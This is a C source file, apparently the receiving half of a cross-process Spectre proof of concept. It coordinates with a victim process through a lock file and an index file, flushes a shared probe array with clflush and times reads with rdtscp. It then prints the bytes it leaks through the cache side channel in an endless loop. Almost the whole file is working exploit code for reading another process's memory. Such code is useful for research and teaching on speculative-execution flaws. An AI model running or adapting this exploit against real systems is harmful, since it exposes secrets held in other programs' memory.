#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <errno.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */

uint8_t *array2;
unsigned int array1_size = 16;
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };

const char *lock_file_name = "spectre.lock";
const char *shared_name = "shared_file";
const char *index_file_name = "index.txt";
int fd_lock, shared_fd;

int results[256];

void train(int train_amount) {
	for (int i = 0; i < train_amount; ++i) {
		// acquire lock
		int locked = -1;
		while (locked != 0) {
			fd_lock = open(lock_file_name, O_CREAT);
			locked = flock(fd_lock, LOCK_EX);
		}

		FILE *f = fopen(index_file_name, "w");
		fprintf(f, "%d", i % 16);
		fclose(f);

		// release lock
		unlink(lock_file_name);
		flock(fd_lock, LOCK_UN);
		close(fd_lock);

		// wait to be deleted
		while (access(index_file_name, F_OK) != -1);
	}
}

void read_index(int index) {
	static int tries, i, reading, j, k, mix_i;
	static unsigned junk = 0;
	static size_t training_x, x;
	register uint64_t time1, time2;
	static volatile uint8_t *addr;

	// acquire lock
	int locked = -1;
	while (locked != 0) {
		fd_lock = open(lock_file_name, O_CREAT);
		locked = flock(fd_lock, LOCK_EX);
	}

	FILE *f = fopen(index_file_name, "w");
	fprintf(f, "%d", index);
	fclose(f);

	for (i = 0; i < 256; i++)
		_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */

	// release lock
	unlink(lock_file_name);
	flock(fd_lock, LOCK_UN);
	close(fd_lock);

	while (access(index_file_name, F_OK) != -1);

	/* Time reads. Order is lightly mixed up to prevent stride prediction */
	for (i = 0; i < 256; i++) {
		mix_i = ((i * 167) + 13) & 255;
		addr = &array2[mix_i * 512];
		time1 = __rdtscp(&junk);            /* READ TIMER */
		junk = *addr;                       /* MEMORY ACCESS TO TIME */
		time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
		if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
			results[mix_i]++;  /* cache hit - add +1 to score for this j */
	}
}

int main() {
	// map share memory area to array2 (cache side channel)
	int fd = open(shared_name, O_RDONLY);
	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ, MAP_SHARED, fd, 0);

	if (array2 == MAP_FAILED) {
		printf("map failed %d >< %d\n", errno, EACCES);
		return 0;
	}

	int tries, i, reading, j, k, mix_i, printed = 0;
	unsigned junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	const int MAX_READINGS = 200;
	const int TRAIN_AMOUNT = 7;

	int offset = 0;
	while (1) {
		// flush results
		for (i = 0; i < 256; ++i) {
			results[i] = 0;
		}

		for (reading = 1; reading < MAX_READINGS; ++reading) {
			train(TRAIN_AMOUNT);
			read_index(offset);
		}

		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}

		printf("%c", j);
		printed += 1;
		fflush(stdout);
		if (printed % 0x50 == 0) {
			printf("\n");
		}

		/* if (j > 31 && j < 127) { */
		/* #<{(| if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) { |)}># */
		/* 	#<{(| printf("%c", (j > 31 && j < 127 ? j : '.')); |)}># */
		/* 	printf("%c", j); */
		/* 	printed += 1; */
		/* 	fflush(stdout); */
		/* 	if (printed % 0x50 == 0) { */
		/* 		printf("\n"); */
		/* 	} */
		/* } */

		++offset;
	}
}
